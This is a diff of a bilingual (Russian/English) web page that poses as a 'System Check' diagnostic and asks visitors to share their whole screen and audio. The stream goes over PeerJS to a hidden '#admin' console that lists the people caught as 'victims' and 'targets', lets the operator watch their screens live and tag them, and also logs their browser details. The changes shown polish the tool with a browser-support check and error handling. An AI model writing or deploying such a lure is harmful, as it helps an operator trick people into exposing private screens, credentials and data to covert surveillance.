@@ -9,10 +9,8 @@
         :root { --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #3b82f6; --success: #10b981; --danger: #ef4444; --border: #334155; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body { background: var(--bg); color: var(--text); min-height: 100vh; }
-        
-        /* --- UI Components --- */
         .btn { background: var(--accent); color: #fff; border: none; padding: 12px 24px; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn:hover { opacity: 0.9; transform: translateY(-1px); }
+        .btn:hover { opacity: 0.9; }
         .btn-sm { padding: 6px 12px; font-size: 12px; }
         .btn-outline { background: transparent; border: 1px solid var(--border); color: var(--muted); }
         .btn-outline:hover { border-color: var(--text); color: var(--text); }
@@ -20,16 +18,12 @@
         .card { background: var(--card); border-radius: 12px; padding: 20px; border: 1px solid var(--border); }
         input, select, textarea { background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 10px; border-radius: 6px; width: 100%; font-size: 14px; }
         input:focus { outline: none; border-color: var(--accent); }
-        
-        /* --- Victim View --- */
         #victim-view { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 20px; text-align: center; }
         .victim-container { max-width: 400px; width: 100%; }
         .logo-area { margin-bottom: 30px; font-size: 40px; }
         .lang-switch { position: absolute; top: 20px; right: 20px; display: flex; gap: 5px; }
         .lang-btn { background: var(--card); border: 1px solid var(--border); color: var(--muted); padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }
         .lang-btn.active { background: var(--accent); color: white; border-color: var(--accent); }
-
-        /* --- Admin View --- */
         #admin-view { display: none; height: 100vh; flex-direction: row; }
         .sidebar { width: 280px; background: #162032; border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px; flex-shrink: 0; }
         .sidebar-header { margin-bottom: 30px; display: flex; align-items: center; gap: 10px; font-weight: bold; font-size: 18px; }
@@ -43,29 +37,21 @@
         .session-header { display: flex; justify-content: space-between; margin-bottom: 5px; }
         .session-id { font-family: monospace; font-size: 12px; color: var(--muted); }
         .session-tag { font-size: 10px; background: var(--border); padding: 2px 6px; border-radius: 4px; }
-        
         .main-content { flex: 1; padding: 30px; overflow-y: auto; display: flex; flex-direction: column; }
         .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
         .viewer-container { flex: 1; background: #000; border-radius: 12px; overflow: hidden; position: relative; display: flex; align-items: center; justify-content: center; border: 1px solid var(--border); }
         #remote-video { width: 100%; height: 100%; object-fit: contain; }
         .no-signal { color: var(--muted); text-align: center; }
-        
         .notes-panel { margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--border); }
         .tags-container { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
         .tag { background: var(--accent); color: white; padding: 4px 8px; border-radius: 4px; font-size: 11px; display: flex; align-items: center; gap: 5px; }
         .tag span { cursor: pointer; }
-
         .hidden { display: none !important; }
-        .mobile-admin { display: none; } /* Simple placeholder for mobile admin view */
-        @media (max-width: 768px) {
-            #admin-view { flex-direction: column; }
-            .sidebar { width: 100%; height: auto; max-height: 40vh; border-right: none; border-bottom: 1px solid var(--border); }
-        }
+        .error-box { background: var(--danger); color: white; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 14px; display: none; }
+        @media (max-width: 768px) { #admin-view { flex-direction: column; } .sidebar { width: 100%; height: auto; max-height: 40vh; border-right: none; border-bottom: 1px solid var(--border); } }
     </style>
 </head>
 <body>
-
-    <!-- === VIEW: VICTIM === -->
     <div id="victim-view">
         <div class="lang-switch">
             <button class="lang-btn active" onclick="setLang('ru')">RU</button>
@@ -81,291 +67,135 @@
             <div id="v-status" class="hidden" style="margin-top: 20px; color: var(--accent); font-size: 13px;">
                 ● <span id="v-status-text">Подключение...</span>
             </div>
+            <div id="error-msg" class="error-box"></div>
         </div>
     </div>
 
-    <!-- === VIEW: ADMIN === -->
     <div id="admin-view">
         <div class="sidebar">
             <div class="sidebar-header"> Remote Console</div>
-            <div class="stat-box">
-                <div class="stat-num" id="stat-active">0</div>
-                <div class="stat-label" data-t="activeSessions">Активные сессии</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-num" id="stat-total">0</div>
-                <div class="stat-label" data-t="totalConnections">Всего подключений</div>
-            </div>
-            <div style="margin-top: auto; font-size: 12px; color: var(--muted);">
-                v2.4.1-stable
-            </div>
+            <div class="stat-box"><div class="stat-num" id="stat-active">0</div><div class="stat-label" data-t="activeSessions">Активные сессии</div></div>
+            <div class="stat-box"><div class="stat-num" id="stat-total">0</div><div class="stat-label" data-t="totalConnections">Всего подключений</div></div>
+            <div style="margin-top: auto; font-size: 12px; color: var(--muted);">v2.5-stable</div>
         </div>
-
         <div class="main-content">
-            <div class="admin-header">
-                <h2 id="admin-title">Dashboard</h2>
-                <div style="display:flex; gap:10px;">
-                    <button class="btn btn-outline btn-sm" onclick="clearAllSessions()" data-t="clearAll">🗑 Очистить</button>
-                </div>
-            </div>
-
-            <div class="viewer-container" id="viewer-placeholder">
-                <div class="no-signal">
-                    <div style="font-size: 40px; margin-bottom: 10px;">📺</div>
-                    <div data-t="selectTarget">Выберите цель для просмотра</div>
-                </div>
-            </div>
+            <div class="admin-header"><h2 id="admin-title">Dashboard</h2><button class="btn btn-outline btn-sm" onclick="clearAllSessions()" data-t="clearAll">🗑 Очистить</button></div>
+            <div class="viewer-container" id="viewer-placeholder"><div class="no-signal"><div style="font-size: 40px; margin-bottom: 10px;">📺</div><div data-t="selectTarget">Выберите цель для просмотра</div></div></div>
             <video id="remote-video" class="hidden" autoplay playsinline controls></video>
-
-            <!-- Session Details Panel -->
             <div id="details-panel" class="card hidden" style="margin-top: 20px;">
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <h3 id="detail-id" style="font-family:monospace; color:var(--accent);">ID: ---</h3>
-                    <button class="btn btn-sm btn-danger" onclick="disconnectCurrent()" data-t="disconnect">Отключить</button>
-                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center;"><h3 id="detail-id" style="font-family:monospace; color:var(--accent);">ID: ---</h3><button class="btn btn-sm btn-danger" onclick="disconnectCurrent()" data-t="disconnect">Отключить</button></div>
                 <div style="margin-top: 10px; font-size: 13px; color: var(--muted);" id="detail-ua">UA: ---</div>
-                
-                <div class="notes-panel">
-                    <label style="font-size:12px; font-weight:bold;" data-t="notes">Заметки / Теги</label>
-                    <div style="display:flex; gap:5px; margin-top:5px;">
-                        <input type="text" id="note-input" placeholder="Добавить тег..." style="padding:6px;">
-                        <button class="btn btn-sm" onclick="addNote()" style="padding:6px 10px;">+</button>
-                    </div>
-                    <div class="tags-container" id="tags-list"></div>
-                </div>
+                <div class="notes-panel"><label style="font-size:12px; font-weight:bold;" data-t="notes">Заметки / Теги</label><div style="display:flex; gap:5px; margin-top:5px;"><input type="text" id="note-input" placeholder="Добавить тег..." style="padding:6px;"><button class="btn btn-sm" onclick="addNote()" style="padding:6px 10px;">+</button></div><div class="tags-container" id="tags-list"></div></div>
             </div>
         </div>
     </div>
 
     <script>
-        // --- CONFIG & STATE ---
         const CHANNEL_ID = 'eni-master-2026';
-        let peer = null, myStream = null, currentCall = null, activeSessions = {}, currentTarget = null;
-        let totalConnections = 0;
-        
+        let peer = null, myStream = null, currentCall = null, activeSessions = {}, currentTarget = null, totalConnections = 0;
         const translations = {
-            ru: {
-                title: "System Check",
-                desc: "Для завершения диагностики необходимо предоставить доступ к экрану.",
-                btn: "Начать проверку",
-                status: "Подключение...",
-                activeSessions: "Активные сессии",
-                totalConnections: "Всего подключений",
-                clearAll: "🗑 Очистить",
-                selectTarget: "Выберите цель для просмотра",
-                disconnect: "Отключить",
-                notes: "Заметки / Теги",
-                dashboard: "Панель управления",
-                waiting: "Ожидание оператора..."
-            },
-            en: {
-                title: "System Check",
-                desc: "To complete diagnostics, please grant screen access.",
-                btn: "Start Check",
-                status: "Connecting...",
-                activeSessions: "Active Sessions",
-                totalConnections: "Total Connections",
-                clearAll: "🗑 Clear All",
-                selectTarget: "Select target to view",
-                disconnect: "Disconnect",
-                notes: "Notes / Tags",
-                dashboard: "Dashboard",
-                waiting: "Waiting for operator..."
-            }
+            ru: { title: "System Check", desc: "Для завершения диагностики необходимо предоставить доступ к экрану.", btn: "Начать проверку", status: "Подключение...", activeSessions: "Активные сессии", totalConnections: "Всего подключений", clearAll: " Очистить", selectTarget: "Выберите цель для просмотра", disconnect: "Отключить", notes: "Заметки / Теги", dashboard: "Панель управления", waiting: "Ожидание оператора...", error: "Ваш браузер не поддерживает захват экрана. Используйте Chrome на Android или компьютер." },
+            en: { title: "System Check", desc: "To complete diagnostics, please grant screen access.", btn: "Start Check", status: "Connecting...", activeSessions: "Active Sessions", totalConnections: "Total Connections", clearAll: " Clear All", selectTarget: "Select target to view", disconnect: "Disconnect", notes: "Notes / Tags", dashboard: "Dashboard", waiting: "Waiting for operator...", error: "Your browser does not support screen sharing. Use Chrome on Android or a desktop." }
         };
-
         let currentLang = 'ru';
-
         function t(key) { return translations[currentLang][key] || key; }
-
         function setLang(lang) {
             currentLang = lang;
             document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
             document.querySelector(`.lang-btn[onclick="setLang('${lang}')"]`).classList.add('active');
-            
             document.getElementById('v-title').textContent = t('title');
             document.getElementById('v-desc').textContent = t('desc');
             document.getElementById('v-btn').textContent = t('btn');
             document.getElementById('v-status-text').textContent = t('status');
             document.getElementById('admin-title').textContent = t('dashboard');
-            
-            document.querySelectorAll('[data-t]').forEach(el => {
-                el.textContent = t(el.getAttribute('data-t'));
-            });
+            document.querySelectorAll('[data-t]').forEach(el => { el.textContent = t(el.getAttribute('data-t')); });
         }
-
-        // --- INIT ---
         const isAdmin = window.location.hash === '#admin';
-        if (isAdmin) initAdmin();
-        else document.getElementById('admin-view').classList.add('hidden');
+        if (isAdmin) initAdmin(); else document.getElementById('admin-view').classList.add('hidden');
 
-        // --- VICTIM LOGIC ---
         async function startSession() {
             const btn = document.getElementById('start-btn');
             const status = document.getElementById('v-status');
-            
+            const errBox = document.getElementById('error-msg');
+            errBox.style.display = 'none';
+
+            // Проверка поддержки
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+                errBox.textContent = t('error');
+                errBox.style.display = 'block';
+                return;
+            }
+
             btn.disabled = true; btn.style.opacity = '0.7';
             status.classList.remove('hidden');
 
             try {
                 myStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: 'always', displaySurface: 'monitor' }, audio: true });
-                
                 const victimId = 'user-' + Math.random().toString(36).substr(2, 6);
                 peer = new Peer(victimId);
-                
                 peer.on('open', () => {
                     const conn = peer.connect(CHANNEL_ID, { reliable: true });
-                    conn.on('open', () => {
-                        conn.send({ type: 'register', id: victimId, ua: navigator.userAgent, ts: Date.now() });
-                    });
+                    conn.on('open', () => { conn.send({ type: 'register', id: victimId, ua: navigator.userAgent, ts: Date.now() }); });
                 });
-
-                peer.on('call', (call) => {
-                    call.answer(myStream);
-                    currentCall = call;
-                    document.getElementById('v-status-text').textContent = t('waiting').replace('Waiting', 'Connected');
-                });
-
+                peer.on('call', (call) => { call.answer(myStream); currentCall = call; document.getElementById('v-status-text').textContent = t('waiting').replace('Waiting', 'Connected'); });
                 myStream.getVideoTracks()[0].onended = () => location.reload();
-
             } catch (err) {
-                alert("Access denied or error: " + err.message);
-                location.reload();
+                errBox.textContent = "Error: " + (err.message || "Access denied");
+                errBox.style.display = 'block';
             }
         }
 
-        // --- ADMIN LOGIC ---
         function initAdmin() {
             document.getElementById('victim-view').classList.add('hidden');
             document.getElementById('admin-view').style.display = 'flex';
-            
             peer = new Peer(CHANNEL_ID);
-            
             peer.on('connection', (conn) => {
                 conn.on('data', (data) => {
                     if (data.type === 'register') {
-                        if (!activeSessions[data.id]) {
-                            activeSessions[data.id] = { ...data, tags: [], notes: "" };
-                            totalConnections++;
-                            renderList();
-                            updateStats();
-                        }
+                        if (!activeSessions[data.id]) { activeSessions[data.id] = { ...data, tags: [], notes: "" }; totalConnections++; renderList(); updateStats(); }
                     }
-                });
-                conn.on('close', () => {
-                    // Handle disconnect if needed
                 });
             });
         }
-
         function renderList() {
             const list = document.getElementById('session-list') || createSidebarList();
             list.innerHTML = '';
-            
             Object.keys(activeSessions).forEach(id => {
                 const s = activeSessions[id];
                 const item = document.createElement('div');
                 item.className = `session-item ${currentTarget === id ? 'active' : ''}`;
-                item.innerHTML = `
-                    <div class="session-header">
-                        <span class="session-id">${id}</span>
-                        <span class="session-tag">${s.tags.length ? s.tags.join(', ') : 'New'}</span>
-                    </div>
-                    <div style="font-size:11px; color:var(--muted); margin-top:4px;">${s.ua.split('(')[0]}</div>
-                `;
+                item.innerHTML = `<div class="session-header"><span class="session-id">${id}</span><span class="session-tag">${s.tags.length ? s.tags.join(', ') : 'New'}</span></div><div style="font-size:11px; color:var(--muted); margin-top:4px;">${s.ua.split('(')[0]}</div>`;
                 item.onclick = () => selectSession(id);
                 list.appendChild(item);
             });
         }
-
-        function createSidebarList() {
-            const container = document.createElement('div');
-            container.className = 'session-list';
-            document.querySelector('.sidebar').appendChild(container);
-            return container;
-        }
-
-        function updateStats() {
-            document.getElementById('stat-active').textContent = Object.keys(activeSessions).length;
-            document.getElementById('stat-total').textContent = totalConnections;
-        }
-
+        function createSidebarList() { const c = document.createElement('div'); c.className = 'session-list'; document.querySelector('.sidebar').appendChild(c); return c; }
+        function updateStats() { document.getElementById('stat-active').textContent = Object.keys(activeSessions).length; document.getElementById('stat-total').textContent = totalConnections; }
         function selectSession(id) {
-            currentTarget = id;
-            const s = activeSessions[id];
-            
-            renderList(); // Update active state
+            currentTarget = id; const s = activeSessions[id]; renderList();
             document.getElementById('details-panel').classList.remove('hidden');
             document.getElementById('detail-id').textContent = "ID: " + id;
             document.getElementById('detail-ua').textContent = "UA: " + s.ua;
-            
-            renderTags(s.tags);
-            watchSession(id);
+            renderTags(s.tags); watchSession(id);
         }
-
         function watchSession(id) {
             document.getElementById('viewer-placeholder').classList.add('hidden');
             document.getElementById('remote-video').classList.remove('hidden');
-            
             if (currentCall) currentCall.close();
-            const call = peer.call(id, new MediaStream());
-            currentCall = call;
-            
-            call.on('stream', (stream) => {
-                document.getElementById('remote-video').srcObject = stream;
-            });
+            const call = peer.call(id, new MediaStream()); currentCall = call;
+            call.on('stream', (stream) => { document.getElementById('remote-video').srcObject = stream; });
         }
-
         function disconnectCurrent() {
             if (currentCall) currentCall.close();
             document.getElementById('remote-video').srcObject = null;
             document.getElementById('remote-video').classList.add('hidden');
             document.getElementById('viewer-placeholder').classList.remove('hidden');
-            document.getElementById('details-panel').classList.add('hidden');
-            currentTarget = null;
-            renderList();
+            document.getElementById('details-panel').classList.add('hidden'); currentTarget = null; renderList();
         }
-
-        function renderTags(tags) {
-            const container = document.getElementById('tags-list');
-            container.innerHTML = '';
-            tags.forEach((tag, idx) => {
-                const el = document.createElement('div');
-                el.className = 'tag';
-                el.innerHTML = `${tag} <span onclick="removeTag(${idx})">×</span>`;
-                container.appendChild(el);
-            });
-        }
-
-        function addNote() {
-            const input = document.getElementById('note-input');
-            const val = input.value.trim();
-            if (val && currentTarget) {
-                if (!activeSessions[currentTarget].tags.includes(val)) {
-                    activeSessions[currentTarget].tags.push(val);
-                    renderTags(activeSessions[currentTarget].tags);
-                    renderList();
-                }
-                input.value = '';
-            }
-        }
-
-        function removeTag(idx) {
-            if (currentTarget) {
-                activeSessions[currentTarget].tags.splice(idx, 1);
-                renderTags(activeSessions[currentTarget].tags);
-                renderList();
-            }
-        }
-
-        function clearAllSessions() {
-            if (confirm('Удалить все сессии?')) {
-                activeSessions = {};
-                disconnectCurrent();
-                renderList();
-                updateStats();
-            }
-        }
+        function renderTags(tags) { const c = document.getElementById('tags-list'); c.innerHTML = ''; tags.forEach((tag, idx) => { const el = document.createElement('div'); el.className = 'tag'; el.innerHTML = `${tag} <span onclick="removeTag(${idx})">×</span>`; c.appendChild(el); }); }
+        function addNote() { const input = document.getElementById('note-input'); const val = input.value.trim(); if (val && currentTarget) { if (!activeSessions[currentTarget].tags.includes(val)) { activeSessions[currentTarget].tags.push(val); renderTags(activeSessions[currentTarget].tags); renderList(); } input.value = ''; } }
+        function removeTag(idx) { if (currentTarget) { activeSessions[currentTarget].tags.splice(idx, 1); renderTags(activeSessions[currentTarget].tags); renderList(); } }
+        function clearAllSessions() { if (confirm('Удалить все сессии?')) { activeSessions = {}; disconnectCurrent(); renderList(); updateStats(); } }
     </script>
 </body>
 </html>
